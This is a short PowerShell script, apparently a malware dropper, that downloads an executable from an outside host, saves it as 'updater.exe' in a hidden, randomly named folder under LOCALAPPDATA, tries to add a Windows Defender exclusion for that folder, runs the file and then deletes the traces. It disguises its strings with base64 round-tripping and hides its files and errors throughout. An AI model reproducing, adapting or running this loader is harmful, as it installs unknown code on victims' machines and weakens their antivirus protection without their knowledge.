# Base64-encoded strings
$downloadUrlB64 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("https://autodownloadnoti.vercel.app/pronoti.exe"))
$updaterExeB64 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("updater.exe"))
$hiddenAttrB64 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("Hidden"))
$silentlyContinueB64 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("SilentlyContinue"))
$stopActionB64 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("Stop"))
$directoryB64 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("Directory"))

# Decode them
$downloadUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($downloadUrlB64))
$updaterExe = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($updaterExeB64))
$hiddenAttr = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($hiddenAttrB64))
$silentlyContinue = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($silentlyContinueB64))
$stopAction = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($stopActionB64))
$directory = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($directoryB64))

# Create a new hidden folder
$hiddenFolderName = "NotifyTemp_" + [System.Guid]::NewGuid().ToString().Substring(0,8)
$hiddenFolder = Join-Path $env:LOCALAPPDATA $hiddenFolderName
New-Item -ItemType $directory -Path $hiddenFolder -Force | Out-Null
$tempPath = Join-Path $hiddenFolder $updaterExe

# Function to add folder exclusion
function Add-FolderExclusion {
    param ([string] $path)
    try {
        Add-MpPreference -ExclusionPath $path -ErrorAction $stopAction
    } catch {
        # Silent fail if no admin rights
    }
}

# Main execution
try {
    # Download the file
    Invoke-WebRequest -Uri $downloadUrl -OutFile $tempPath -UseBasicParsing -ErrorAction $stopAction
    
    # Set folder and file as hidden
    Set-ItemProperty -Path $hiddenFolder -Name Attributes -Value $hiddenAttr
    Set-ItemProperty -Path $tempPath -Name Attributes -Value $hiddenAttr
    
    # Try to exclude the entire folder
    Add-FolderExclusion -path $hiddenFolder
    
    # Run the file directly in the current session
    & $tempPath
    
    # Wait briefly for it to execute
    Start-Sleep -Seconds 2
    
    # Clean up
    Remove-Item $hiddenFolder -Recurse -Force -ErrorAction $silentlyContinue
} catch {
    # Output error for debugging
    Write-Host "Error: $_"
    exit 1
} finally {
    # Silent finish
}
